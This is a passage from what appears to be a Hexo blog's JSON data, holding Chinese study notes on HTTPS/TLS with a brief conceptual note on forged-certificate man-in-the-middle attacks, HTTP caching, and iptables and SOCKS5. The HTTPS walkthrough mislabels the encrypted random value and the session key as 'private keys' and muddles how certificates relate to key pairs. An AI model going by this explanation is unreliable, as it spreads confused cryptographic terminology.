B，私钥 C 对黑客来说都是透明的。\n* 所以黑客只要诱导用户安装自己伪造的证书就可以，例如各种钓鱼的不可描述网站\n\n# 推荐阅读\n\n[https 加密过程和 tls 证书验证](https://juejin.im/post/5a4f4884518825732b19a3ce)\n","source":"_posts/study-https-02.md","raw":"---\ntitle: 加密传输之HTTPS\ndate: 2018-05-13 19:24:11\ntags: 浏览器\n---\n\n## http 和 https\n\n常规的 http 请求，所有信息明文传播，只要中间人在链路中的任意阶段进行劫持，就会带来三大风险：\n\n* 窃听风险：第三方可以获取通信内容\n* 篡改风险：第三方可以修改通信内容\n* 冒充风险：第三方可以冒充他人身份参与通信\n\nhttps 可以解决这些问题\n\n### https\n\n> http+TLS，TLS 是传输层加密协议，前身是 SSL 协议（1999 年应用广泛，然后标准化，改名就是 TLS，所以同一个东西的不同阶段）\n\nSSL/TLS 协议是为了解决 http 的三大风险而设计的，希望达到：\n\n* 内容加密：所有信息不再明文传播，都是加密的，第三方无法窃听\n* 数据完整性：防止内容被第三方冒充或者篡改。具有校验机制，一旦被篡改，通信双方会立刻发现。\n* 身份认证：配备身份证书，防止身份被冒充。即使被 DNS 劫持到了第三方站点，也会提醒用户有可能被劫持。\n\n#### DNS 劫持\n\n> 又叫域名劫持\n\n* 是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名\n\n[深入理解 http 请求，dns 劫持与解析](https://juejin.im/post/59ba146c6fb9a00a4636d8b6)\n[dns 劫持和 http 劫持的区别](https://www.zhihu.com/question/27035513)\n\n## https 流程\n\n* 客户端发起 https 请求\n* 服务端的配置\n  * 一般需要向权威机构申请一个证书（也可以自己制作，这个会在之后的中间人攻击中讲到，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会提示），证书会生成 RSA 加密使用的一对公钥 A 和私钥 B\n* 传送证书\n  * 这个证书主要内容是公钥 A，也包含了其他信息，如证书的颁发机构，过期时间等等\n* 客户端解析证书\n  * 由客户端的 TLS 来完成的，主要是验证公钥 A 是否有效，比如颁发机构，过期时间等等，如果发现异常就会弹出一个警告框，提示证书有问题\n  * 如果证书没有问题，那么就生成一个随机值（秘钥 D）。之后就进入了不对称加密（RSA）的过程，用证书对该随机值加密（秘钥 D），生成私钥 C\n* 传送加密信息\n  * 这部分传送的是用证书加密后的随机值（私钥 C）\n* 服务端解密信息\n  * 服务端私钥 B 解密私钥 C 后，得到客户端传过来的秘钥 D，到此 RSA 非对称加密的过程结束，后续所有的数据都可以用私钥 D，进行对称加密和解密\n* 传输加密后的信息\n  * 服务端用秘钥 D 加密信息\n* 客户端解密信息\n  * 客户端用之前生成的私钥 D 解密服务端传过来的信息，于是获取到了解密后的内容\n\n## 中间人攻击\n\n> https 信息的安全完全建立在证书可信的基础上，如果中间人伪造证书怎么办？\n\n* 黑客自己伪造的证书需要通过客户端验证通过，才可以继续访问，只要客户端验证通过，那么公钥 A，私钥 B，私钥 C 对黑客来说都是透明的。\n* 所以黑客只要诱导用户安装自己伪造的证书就可以，例如各种钓鱼的不可描述网站\n\n# 推荐阅读\n\n[https 加密过程和 tls 证书验证](https://juejin.im/post/5a4f4884518825732b19a3ce)\n","slug":"study-https-02","published":1,"updated":"2018-05-24T07:16:03.090Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r400300iof299oey7i","content":"<h2 id=\"http-和-https\"><a href=\"#http-和-https\" class=\"headerlink\" title=\"http 和 https\"></a>http 和 https</h2><p>常规的 http 请求，所有信息明文传播，只要中间人在链路中的任意阶段进行劫持，就会带来三大风险：</p>\n<ul>\n<li>窃听风险：第三方可以获取通信内容</li>\n<li>篡改风险：第三方可以修改通信内容</li>\n<li>冒充风险：第三方可以冒充他人身份参与通信</li>\n</ul>\n<p>https 可以解决这些问题</p>\n<h3 id=\"https\"><a href=\"#https\" class=\"headerlink\" title=\"https\"></a>https</h3><blockquote>\n<p>http+TLS，TLS 是传输层加密协议，前身是 SSL 协议（1999 年应用广泛，然后标准化，改名就是 TLS，所以同一个东西的不同阶段）</p>\n</blockquote>\n<p>SSL/TLS 协议是为了解决 http 的三大风险而设计的，希望达到：</p>\n<ul>\n<li>内容加密：所有信息不再明文传播，都是加密的，第三方无法窃听</li>\n<li>数据完整性：防止内容被第三方冒充或者篡改。具有校验机制，一旦被篡改，通信双方会立刻发现。</li>\n<li>身份认证：配备身份证书，防止身份被冒充。即使被 DNS 劫持到了第三方站点，也会提醒用户有可能被劫持。</li>\n</ul>\n<h4 id=\"DNS-劫持\"><a href=\"#DNS-劫持\" class=\"headerlink\" title=\"DNS 劫持\"></a>DNS 劫持</h4><blockquote>\n<p>又叫域名劫持</p>\n</blockquote>\n<ul>\n<li>是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名</li>\n</ul>\n<p><a href=\"https://juejin.im/post/59ba146c6fb9a00a4636d8b6\" target=\"_blank\" rel=\"noopener\">深入理解 http 请求，dns 劫持与解析</a><br><a href=\"https://www.zhihu.com/question/27035513\" target=\"_blank\" rel=\"noopener\">dns 劫持和 http 劫持的区别</a></p>\n<h2 id=\"https-流程\"><a href=\"#https-流程\" class=\"headerlink\" title=\"https 流程\"></a>https 流程</h2><ul>\n<li>客户端发起 https 请求</li>\n<li>服务端的配置<ul>\n<li>一般需要向权威机构申请一个证书（也可以自己制作，这个会在之后的中间人攻击中讲到，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会提示），证书会生成 RSA 加密使用的一对公钥 A 和私钥 B</li>\n</ul>\n</li>\n<li>传送证书<ul>\n<li>这个证书主要内容是公钥 A，也包含了其他信息，如证书的颁发机构，过期时间等等</li>\n</ul>\n</li>\n<li>客户端解析证书<ul>\n<li>由客户端的 TLS 来完成的，主要是验证公钥 A 是否有效，比如颁发机构，过期时间等等，如果发现异常就会弹出一个警告框，提示证书有问题</li>\n<li>如果证书没有问题，那么就生成一个随机值（秘钥 D）。之后就进入了不对称加密（RSA）的过程，用证书对该随机值加密（秘钥 D），生成私钥 C</li>\n</ul>\n</li>\n<li>传送加密信息<ul>\n<li>这部分传送的是用证书加密后的随机值（私钥 C）</li>\n</ul>\n</li>\n<li>服务端解密信息<ul>\n<li>服务端私钥 B 解密私钥 C 后，得到客户端传过来的秘钥 D，到此 RSA 非对称加密的过程结束，后续所有的数据都可以用私钥 D，进行对称加密和解密</li>\n</ul>\n</li>\n<li>传输加密后的信息<ul>\n<li>服务端用秘钥 D 加密信息</li>\n</ul>\n</li>\n<li>客户端解密信息<ul>\n<li>客户端用之前生成的私钥 D 解密服务端传过来的信息，于是获取到了解密后的内容</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"中间人攻击\"><a href=\"#中间人攻击\" class=\"headerlink\" title=\"中间人攻击\"></a>中间人攻击</h2><blockquote>\n<p>https 信息的安全完全建立在证书可信的基础上，如果中间人伪造证书怎么办？</p>\n</blockquote>\n<ul>\n<li>黑客自己伪造的证书需要通过客户端验证通过，才可以继续访问，只要客户端验证通过，那么公钥 A，私钥 B，私钥 C 对黑客来说都是透明的。</li>\n<li>所以黑客只要诱导用户安装自己伪造的证书就可以，例如各种钓鱼的不可描述网站</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><p><a href=\"https://juejin.im/post/5a4f4884518825732b19a3ce\" target=\"_blank\" rel=\"noopener\">https 加密过程和 tls 证书验证</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"http-和-https\"><a href=\"#http-和-https\" class=\"headerlink\" title=\"http 和 https\"></a>http 和 https</h2><p>常规的 http 请求，所有信息明文传播，只要中间人在链路中的任意阶段进行劫持，就会带来三大风险：</p>\n<ul>\n<li>窃听风险：第三方可以获取通信内容</li>\n<li>篡改风险：第三方可以修改通信内容</li>\n<li>冒充风险：第三方可以冒充他人身份参与通信</li>\n</ul>\n<p>https 可以解决这些问题</p>\n<h3 id=\"https\"><a href=\"#https\" class=\"headerlink\" title=\"https\"></a>https</h3><blockquote>\n<p>http+TLS，TLS 是传输层加密协议，前身是 SSL 协议（1999 年应用广泛，然后标准化，改名就是 TLS，所以同一个东西的不同阶段）</p>\n</blockquote>\n<p>SSL/TLS 协议是为了解决 http 的三大风险而设计的，希望达到：</p>\n<ul>\n<li>内容加密：所有信息不再明文传播，都是加密的，第三方无法窃听</li>\n<li>数据完整性：防止内容被第三方冒充或者篡改。具有校验机制，一旦被篡改，通信双方会立刻发现。</li>\n<li>身份认证：配备身份证书，防止身份被冒充。即使被 DNS 劫持到了第三方站点，也会提醒用户有可能被劫持。</li>\n</ul>\n<h4 id=\"DNS-劫持\"><a href=\"#DNS-劫持\" class=\"headerlink\" title=\"DNS 劫持\"></a>DNS 劫持</h4><blockquote>\n<p>又叫域名劫持</p>\n</blockquote>\n<ul>\n<li>是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名</li>\n</ul>\n<p><a href=\"https://juejin.im/post/59ba146c6fb9a00a4636d8b6\" target=\"_blank\" rel=\"noopener\">深入理解 http 请求，dns 劫持与解析</a><br><a href=\"https://www.zhihu.com/question/27035513\" target=\"_blank\" rel=\"noopener\">dns 劫持和 http 劫持的区别</a></p>\n<h2 id=\"https-流程\"><a href=\"#https-流程\" class=\"headerlink\" title=\"https 流程\"></a>https 流程</h2><ul>\n<li>客户端发起 https 请求</li>\n<li>服务端的配置<ul>\n<li>一般需要向权威机构申请一个证书（也可以自己制作，这个会在之后的中间人攻击中讲到，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会提示），证书会生成 RSA 加密使用的一对公钥 A 和私钥 B</li>\n</ul>\n</li>\n<li>传送证书<ul>\n<li>这个证书主要内容是公钥 A，也包含了其他信息，如证书的颁发机构，过期时间等等</li>\n</ul>\n</li>\n<li>客户端解析证书<ul>\n<li>由客户端的 TLS 来完成的，主要是验证公钥 A 是否有效，比如颁发机构，过期时间等等，如果发现异常就会弹出一个警告框，提示证书有问题</li>\n<li>如果证书没有问题，那么就生成一个随机值（秘钥 D）。之后就进入了不对称加密（RSA）的过程，用证书对该随机值加密（秘钥 D），生成私钥 C</li>\n</ul>\n</li>\n<li>传送加密信息<ul>\n<li>这部分传送的是用证书加密后的随机值（私钥 C）</li>\n</ul>\n</li>\n<li>服务端解密信息<ul>\n<li>服务端私钥 B 解密私钥 C 后，得到客户端传过来的秘钥 D，到此 RSA 非对称加密的过程结束，后续所有的数据都可以用私钥 D，进行对称加密和解密</li>\n</ul>\n</li>\n<li>传输加密后的信息<ul>\n<li>服务端用秘钥 D 加密信息</li>\n</ul>\n</li>\n<li>客户端解密信息<ul>\n<li>客户端用之前生成的私钥 D 解密服务端传过来的信息，于是获取到了解密后的内容</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"中间人攻击\"><a href=\"#中间人攻击\" class=\"headerlink\" title=\"中间人攻击\"></a>中间人攻击</h2><blockquote>\n<p>https 信息的安全完全建立在证书可信的基础上，如果中间人伪造证书怎么办？</p>\n</blockquote>\n<ul>\n<li>黑客自己伪造的证书需要通过客户端验证通过，才可以继续访问，只要客户端验证通过，那么公钥 A，私钥 B，私钥 C 对黑客来说都是透明的。</li>\n<li>所以黑客只要诱导用户安装自己伪造的证书就可以，例如各种钓鱼的不可描述网站</li>\n</ul>\n<h1 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h1><p><a href=\"https://juejin.im/post/5a4f4884518825732b19a3ce\" target=\"_blank\" rel=\"noopener\">https 加密过程和 tls 证书验证</a></p>\n"},{"title":"浅谈前端缓存(二)","date":"2018-05-13T06:33:46.000Z","_content":"\n## 缓存历史\n\n### http1.0 时代\n\n* 主要通过 Pragma 和 Expires 这两个字段来规范。现在仍然有些古老的客户端不支持 http1.1，所以这个两个头还在使用。\n\n#### Expires 字段不准确\n\n* 是服务器返回该请求结果缓存的到期时间，如果再次发出这个请求，客户端的时间小于 Expires 的值，直接使用缓存结果\n* 但是客户端和服务器如果有一方的时间不准确，比如时区，比如客户故意调整系统时间，都会失效\n\n### http1.1 时代\n\n* 主要就是 Cache-Control 来控制了\n\n## 强缓存\n\n* 命中状态码是 200，后面会跟着 from cache。现在高版本的 Chrome 换成了 from disk cache（磁盘缓存）和 from memory cache（内存缓存）\n\n### 内存缓存\n\n* 快速读取：将编译解析后的文件，直接存入该进程的内存，占据该进程的一定内存资源，以方便下次运行的快速读取\n* 时效性：一旦进程关闭，那么该进程的内存将会被清空\n\n### 磁盘缓存\n\n* 直接将缓存写入磁盘文件中，读取缓存需要对缓存存放的硬盘文件进行 I/0 操作，然后重新解析该缓存内容，读取复杂，内容比内存缓存慢。\n\n## 只有 get 请求能被缓存，post 不可以\n\n* get 方法是从指定的资源请求数据，post 是向指定资源提交要被处理的数据\n* get 请求可以被缓存，只应当用于取回数据，请求长度有限制\n* post 请求不会被缓存，对数据长度没有要求\n\n## 用户操作与缓存的关系\n\n* 当按 F5 进行刷新的时候，会忽略叼 Expires/Cache-control 的设置，会再次发送请求取服务器请求，而 Last-Modified/ETag 还是有效的。就是有可能命中协商缓存。\n* 当按住 ctrl+f5 进行强制刷新的时候，所有缓存机制都将失效\n* 其他一些操作比如，地址栏回车，前进后退都不会影响缓存字段\n\n## 缓存命中率\n\n* 缓存命中率：从缓存中得到数据的请求数与所有请求数的比率。理想状态是越高越好。\n\n## 推荐阅读\n\n[node 实践 http 缓存](https://github.com/renjie1996/Doger-FrontEnd-Blog/issues/2)\n","source":"_posts/study-cache02.md","raw":"---\ntitle: 浅谈前端缓存(二)\ndate: 2018-05-13 14:33:46\ntags: 浏览器\n---\n\n## 缓存历史\n\n### http1.0 时代\n\n* 主要通过 Pragma 和 Expires 这两个字段来规范。现在仍然有些古老的客户端不支持 http1.1，所以这个两个头还在使用。\n\n#### Expires 字段不准确\n\n* 是服务器返回该请求结果缓存的到期时间，如果再次发出这个请求，客户端的时间小于 Expires 的值，直接使用缓存结果\n* 但是客户端和服务器如果有一方的时间不准确，比如时区，比如客户故意调整系统时间，都会失效\n\n### http1.1 时代\n\n* 主要就是 Cache-Control 来控制了\n\n## 强缓存\n\n* 命中状态码是 200，后面会跟着 from cache。现在高版本的 Chrome 换成了 from disk cache（磁盘缓存）和 from memory cache（内存缓存）\n\n### 内存缓存\n\n* 快速读取：将编译解析后的文件，直接存入该进程的内存，占据该进程的一定内存资源，以方便下次运行的快速读取\n* 时效性：一旦进程关闭，那么该进程的内存将会被清空\n\n### 磁盘缓存\n\n* 直接将缓存写入磁盘文件中，读取缓存需要对缓存存放的硬盘文件进行 I/0 操作，然后重新解析该缓存内容，读取复杂，内容比内存缓存慢。\n\n## 只有 get 请求能被缓存，post 不可以\n\n* get 方法是从指定的资源请求数据，post 是向指定资源提交要被处理的数据\n* get 请求可以被缓存，只应当用于取回数据，请求长度有限制\n* post 请求不会被缓存，对数据长度没有要求\n\n## 用户操作与缓存的关系\n\n* 当按 F5 进行刷新的时候，会忽略叼 Expires/Cache-control 的设置，会再次发送请求取服务器请求，而 Last-Modified/ETag 还是有效的。就是有可能命中协商缓存。\n* 当按住 ctrl+f5 进行强制刷新的时候，所有缓存机制都将失效\n* 其他一些操作比如，地址栏回车，前进后退都不会影响缓存字段\n\n## 缓存命中率\n\n* 缓存命中率：从缓存中得到数据的请求数与所有请求数的比率。理想状态是越高越好。\n\n## 推荐阅读\n\n[node 实践 http 缓存](https://github.com/renjie1996/Doger-FrontEnd-Blog/issues/2)\n","slug":"study-cache02","published":1,"updated":"2018-05-13T07:58:22.804Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r500330iof6vu1q55a","content":"<h2 id=\"缓存历史\"><a href=\"#缓存历史\" class=\"headerlink\" title=\"缓存历史\"></a>缓存历史</h2><h3 id=\"http1-0-时代\"><a href=\"#http1-0-时代\" class=\"headerlink\" title=\"http1.0 时代\"></a>http1.0 时代</h3><ul>\n<li>主要通过 Pragma 和 Expires 这两个字段来规范。现在仍然有些古老的客户端不支持 http1.1，所以这个两个头还在使用。</li>\n</ul>\n<h4 id=\"Expires-字段不准确\"><a href=\"#Expires-字段不准确\" class=\"headerlink\" title=\"Expires 字段不准确\"></a>Expires 字段不准确</h4><ul>\n<li>是服务器返回该请求结果缓存的到期时间，如果再次发出这个请求，客户端的时间小于 Expires 的值，直接使用缓存结果</li>\n<li>但是客户端和服务器如果有一方的时间不准确，比如时区，比如客户故意调整系统时间，都会失效</li>\n</ul>\n<h3 id=\"http1-1-时代\"><a href=\"#http1-1-时代\" class=\"headerlink\" title=\"http1.1 时代\"></a>http1.1 时代</h3><ul>\n<li>主要就是 Cache-Control 来控制了</li>\n</ul>\n<h2 id=\"强缓存\"><a href=\"#强缓存\" class=\"headerlink\" title=\"强缓存\"></a>强缓存</h2><ul>\n<li>命中状态码是 200，后面会跟着 from cache。现在高版本的 Chrome 换成了 from disk cache（磁盘缓存）和 from memory cache（内存缓存）</li>\n</ul>\n<h3 id=\"内存缓存\"><a href=\"#内存缓存\" class=\"headerlink\" title=\"内存缓存\"></a>内存缓存</h3><ul>\n<li>快速读取：将编译解析后的文件，直接存入该进程的内存，占据该进程的一定内存资源，以方便下次运行的快速读取</li>\n<li>时效性：一旦进程关闭，那么该进程的内存将会被清空</li>\n</ul>\n<h3 id=\"磁盘缓存\"><a href=\"#磁盘缓存\" class=\"headerlink\" title=\"磁盘缓存\"></a>磁盘缓存</h3><ul>\n<li>直接将缓存写入磁盘文件中，读取缓存需要对缓存存放的硬盘文件进行 I/0 操作，然后重新解析该缓存内容，读取复杂，内容比内存缓存慢。</li>\n</ul>\n<h2 id=\"只有-get-请求能被缓存，post-不可以\"><a href=\"#只有-get-请求能被缓存，post-不可以\" class=\"headerlink\" title=\"只有 get 请求能被缓存，post 不可以\"></a>只有 get 请求能被缓存，post 不可以</h2><ul>\n<li>get 方法是从指定的资源请求数据，post 是向指定资源提交要被处理的数据</li>\n<li>get 请求可以被缓存，只应当用于取回数据，请求长度有限制</li>\n<li>post 请求不会被缓存，对数据长度没有要求</li>\n</ul>\n<h2 id=\"用户操作与缓存的关系\"><a href=\"#用户操作与缓存的关系\" class=\"headerlink\" title=\"用户操作与缓存的关系\"></a>用户操作与缓存的关系</h2><ul>\n<li>当按 F5 进行刷新的时候，会忽略叼 Expires/Cache-control 的设置，会再次发送请求取服务器请求，而 Last-Modified/ETag 还是有效的。就是有可能命中协商缓存。</li>\n<li>当按住 ctrl+f5 进行强制刷新的时候，所有缓存机制都将失效</li>\n<li>其他一些操作比如，地址栏回车，前进后退都不会影响缓存字段</li>\n</ul>\n<h2 id=\"缓存命中率\"><a href=\"#缓存命中率\" class=\"headerlink\" title=\"缓存命中率\"></a>缓存命中率</h2><ul>\n<li>缓存命中率：从缓存中得到数据的请求数与所有请求数的比率。理想状态是越高越好。</li>\n</ul>\n<h2 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h2><p><a href=\"https://github.com/renjie1996/Doger-FrontEnd-Blog/issues/2\" target=\"_blank\" rel=\"noopener\">node 实践 http 缓存</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"缓存历史\"><a href=\"#缓存历史\" class=\"headerlink\" title=\"缓存历史\"></a>缓存历史</h2><h3 id=\"http1-0-时代\"><a href=\"#http1-0-时代\" class=\"headerlink\" title=\"http1.0 时代\"></a>http1.0 时代</h3><ul>\n<li>主要通过 Pragma 和 Expires 这两个字段来规范。现在仍然有些古老的客户端不支持 http1.1，所以这个两个头还在使用。</li>\n</ul>\n<h4 id=\"Expires-字段不准确\"><a href=\"#Expires-字段不准确\" class=\"headerlink\" title=\"Expires 字段不准确\"></a>Expires 字段不准确</h4><ul>\n<li>是服务器返回该请求结果缓存的到期时间，如果再次发出这个请求，客户端的时间小于 Expires 的值，直接使用缓存结果</li>\n<li>但是客户端和服务器如果有一方的时间不准确，比如时区，比如客户故意调整系统时间，都会失效</li>\n</ul>\n<h3 id=\"http1-1-时代\"><a href=\"#http1-1-时代\" class=\"headerlink\" title=\"http1.1 时代\"></a>http1.1 时代</h3><ul>\n<li>主要就是 Cache-Control 来控制了</li>\n</ul>\n<h2 id=\"强缓存\"><a href=\"#强缓存\" class=\"headerlink\" title=\"强缓存\"></a>强缓存</h2><ul>\n<li>命中状态码是 200，后面会跟着 from cache。现在高版本的 Chrome 换成了 from disk cache（磁盘缓存）和 from memory cache（内存缓存）</li>\n</ul>\n<h3 id=\"内存缓存\"><a href=\"#内存缓存\" class=\"headerlink\" title=\"内存缓存\"></a>内存缓存</h3><ul>\n<li>快速读取：将编译解析后的文件，直接存入该进程的内存，占据该进程的一定内存资源，以方便下次运行的快速读取</li>\n<li>时效性：一旦进程关闭，那么该进程的内存将会被清空</li>\n</ul>\n<h3 id=\"磁盘缓存\"><a href=\"#磁盘缓存\" class=\"headerlink\" title=\"磁盘缓存\"></a>磁盘缓存</h3><ul>\n<li>直接将缓存写入磁盘文件中，读取缓存需要对缓存存放的硬盘文件进行 I/0 操作，然后重新解析该缓存内容，读取复杂，内容比内存缓存慢。</li>\n</ul>\n<h2 id=\"只有-get-请求能被缓存，post-不可以\"><a href=\"#只有-get-请求能被缓存，post-不可以\" class=\"headerlink\" title=\"只有 get 请求能被缓存，post 不可以\"></a>只有 get 请求能被缓存，post 不可以</h2><ul>\n<li>get 方法是从指定的资源请求数据，post 是向指定资源提交要被处理的数据</li>\n<li>get 请求可以被缓存，只应当用于取回数据，请求长度有限制</li>\n<li>post 请求不会被缓存，对数据长度没有要求</li>\n</ul>\n<h2 id=\"用户操作与缓存的关系\"><a href=\"#用户操作与缓存的关系\" class=\"headerlink\" title=\"用户操作与缓存的关系\"></a>用户操作与缓存的关系</h2><ul>\n<li>当按 F5 进行刷新的时候，会忽略叼 Expires/Cache-control 的设置，会再次发送请求取服务器请求，而 Last-Modified/ETag 还是有效的。就是有可能命中协商缓存。</li>\n<li>当按住 ctrl+f5 进行强制刷新的时候，所有缓存机制都将失效</li>\n<li>其他一些操作比如，地址栏回车，前进后退都不会影响缓存字段</li>\n</ul>\n<h2 id=\"缓存命中率\"><a href=\"#缓存命中率\" class=\"headerlink\" title=\"缓存命中率\"></a>缓存命中率</h2><ul>\n<li>缓存命中率：从缓存中得到数据的请求数与所有请求数的比率。理想状态是越高越好。</li>\n</ul>\n<h2 id=\"推荐阅读\"><a href=\"#推荐阅读\" class=\"headerlink\" title=\"推荐阅读\"></a>推荐阅读</h2><p><a href=\"https://github.com/renjie1996/Doger-FrontEnd-Blog/issues/2\" target=\"_blank\" rel=\"noopener\">node 实践 http 缓存</a></p>\n"},{"title":"通过一个场景了解iptables和socks5协议","date":"2018-06-13T03:27:06.000Z","_content":"\n# 场景\n\n* 在 vultr 买了一个服务器后，发现可以 ping 通\n* 但是输入网址却无法连接\n* 但是开启了 ss 之后，可以连接到这个服务器\n\n### 解决办法\n\n* 一开始以为是墙的问题，可以封禁端口，导致 80 端口不能使用\n* 但是我换了其他端口也无法连接\n* 后来用 wireshark 抓包，发现返回 icmp 协议： host administratively prohibited\n* 谷歌后查发现是服务器防火墙没有开放 80 端口的缘故\n* 那么另外一个问题随之而来呢，为什么通过 ss 之后就可以连接到服务器呢\n* [ss 服务端和 ss 客户端用 socks5 协议封装，服务端再发到真正的目的地](https://github.com/shadowsocks/shadowsocks/issues/1130)\n* 换句话 socks5 协议穿透了防火墙，可以查看[这里](https://segmentfault.com/a/1190000011862912#articleHeader2)\n\n# SOCK5 协议\n\n> 以下来自[维基百科](https://zh.wikipedia.org/wiki/SOCKS)\n\n* SOCKS5 是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS 是\"SOCKetS\"的缩写\n\n## 目的\n\n* SOCKS5 是一个代理协议，旨在为位于 Intranet 防火墙后的用户提供访问 Internet 的代理服务，这是个有一定年头的协议，其 RFC 提案的时间比 HTTP 1.0 还要早两个月\n\n## 用途\n\n* [防火墙穿透](http://zhihan.me/network/2017/09/24/socks5-protocol/)\n\n## 实现\n\n* [socks 代理实现](https://github.com/gwuhaolin/blog/issues/12)\n\n# iptables\n\n> 以下来自[维基百科](<https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)>)\n\n* iptables 是 linux 内核防火墙的命令行工具\n* 通常也指代内核级防火墙\n* iptables 用于 ipv4，ip6tables 用于 ipv6\n* iptables 可以检测，修改，转发，重定向和丢弃 ipv4 数据包\n\n## 基本概念\n\n### 表（tables）\n\n* 过滤 ipv4 数据包的代码已经内置于内核之中，并且按照不同的目的被组织成表的集合\n* 表由一组预先定义的链组成，链包含遍历顺序规则\n* 包含五张表，比较常用的就是 filter 表：用于存放于与防火墙相关操作的默认表\n\n### 链(chain)\n\n* 表由链组成\n* 内核空间中：从一个网络接口进来，到另一个网络接口取得 PREROUTING（路由前）\n* 数据包从内核流入用户空间的 INPUT （数据包流入口）\n* 数据包从用户空间流出的 FORWARD （转发关卡）\n* 进入/离开本机的外网接口 OUTPUT （数据包出口）\n* 进入/离开本机的内网接口 POSTROUTING （路由后）\n\n## 操作\n\n* 去到所在文件，一般是在/etc/init.d/iptables\n* 可以进行关闭(stop)，开启（start），重启（restart）\n\n# 推荐阅读\n\n* [iptables 深入理解](http://www.cnblogs.com/lvxiaobo616/p/5715739.html)\n","source":"_posts/study-iptables-01.md","raw":"---\ntitle: 通过一个场景了解iptables和socks5协议\ndate: 2018-06-13 11:27:06\ntags: 计算机基础\n---\n\n# 场景\n\n* 在 vultr 买了一个服务器后，发现可以 ping 通\n* 但是输入网址却无法连接\n* 但是开启了 ss 之后，可以连接到这个服务器\n\n### 解决办法\n\n* 一开始以为是墙的问题，可以封禁端口，导致 80 端口不能使用\n* 但是我换了其他端口也无法连接\n* 后来用 wireshark 抓包，发现返回 icmp 协议： host administratively prohibited\n* 谷歌后查发现是服务器防火墙没有开放 80 端口的缘故\n* 那么另外一个问题随之而来呢，为什么通过 ss 之后就可以连接到服务器呢\n* [ss 服务端和 ss 客户端用 socks5 协议封装，服务端再发到真正的目的地](https://github.com/shadowsocks/shadowsocks/issues/1130)\n* 换句话 socks5 协议穿透了防火墙，可以查看[这里](https://segmentfault.com/a/1190000011862912#articleHeader2)\n\n# SOCK5 协议\n\n> 以下来自[维基百科](https://zh.wikipedia.org/wiki/SOCKS)\n\n* SOCKS5 是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS 是\"SOCKetS\"的缩写\n\n## 目的\n\n* SOCKS5 是一个代理协议，旨在为位于 Intranet 防火墙后的用户提供访问 Internet 的代理服务，这是个有一定年头的协议，其 RFC 提案的时间比 HTTP 1.0 还要早两个月\n\n## 用途\n\n* [防火墙穿透](http://zhihan.me/network/2017/09/24/socks5-protocol/)\n\n## 实现\n\n* [socks 代理实现](https://github.com/gwuhaolin/blog/issues/12)\n\n# iptables\n\n> 以下来自[维基百科](<https://wiki.archlinux.org/index.php/Iptables_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)>)\n\n* iptables 是 linux 内核防火墙的命令行工具\n* 通常也指代内核级防火墙\n* iptables 用于 ipv4，ip6tables 用于 ipv6\n* iptables 可以检测，修改，转发，重定向和丢弃 ipv4 数据包\n\n## 基本概念\n\n### 表（tables）\n\n* 过滤 ipv4 数据包的代码已经内置于内核之中，并且按照不同的目的被组织成表的集合\n* 表由一组预先定义的链组成，链包含遍历顺序规则\n* 包含五张表，比较常用的就是 filter 表：用于存放于与防火墙相关操作的默认表\n\n### 链(chain)\n\n* 表由链组成\n* 内核空间中：从一个网络接口进来，到另一个网络接口取得 PREROUTING（路由前）\n* 数据包从内核流入用户空间的 INPUT （数据包流入口）\n* 数据包从用户空间流出的 FORWARD （转发关卡）\n* 进入/离开本机的外网接口 OUTPUT （数据包出口）\n* 进入/离开本机的内网接口 POSTROUTING （路由后）\n\n## 操作\n\n* 去到所在文件，一般是在/etc/init.d/iptables\n* 可以进行关闭(stop)，开启（start），重启（restart）\n\n# 推荐阅读\n\n* [iptables 深入理解](http://www.cnblogs.com/lvxiaobo616/p/5715739.html)\n","slug":"study-iptables-01","published":1,"updated":"2018-06-20T13:20:23.566Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034r600350ioft3jdfi9m","content":"<h1 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h1><ul>\n<li>在 vultr 买了一个服务器后，发现可以 ping 通</li>\n<li>但是输入网址却无法连接</li>\n<li>但是开启了 ss 之后，可以连接到这个服务器</li>\n</ul>\n<h3 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h3><ul>\n<li>一开始以为是墙的问题，可以封禁端口，导致 80 端口不能使用</li>\n<li>但是我换了其他端口也无法连接</li>\n<li>后来用 wireshark 抓包，发现返回 icmp 协议： host administratively prohibited</li>\n<li>谷歌后查发现是服务器防火墙没有开放 80 端口的缘故</li>\n<li>那么另外一个问题随之而来呢，为什么通过 ss 之后就可以连接到服务器呢</li>\n<li><a href=\"https://github.com/shadowsocks/shadowsocks/issues/1130\" target=\"_blank\" rel=\"noopener\">ss 服务端和 ss 客户端用 socks5 协议封装，服务端再发到真正的目的地</a></li>\n<li>换句话 socks5 协议穿透了防火墙，可以查看<a href=\"https://segmentfault.com/a/1190000011862912#articleHeader2\" target=\"_blank\" rel=\"noopener\">这里</a></li>\n</ul>\n<h1 id=\"SOCK5-协议\"><a href=\"#SOCK5-协议\" class=\"headerlink\" title=\"SOCK5 协议\"></a>SOCK5 协议</h1><blockquote>\n<p>以下来自<a 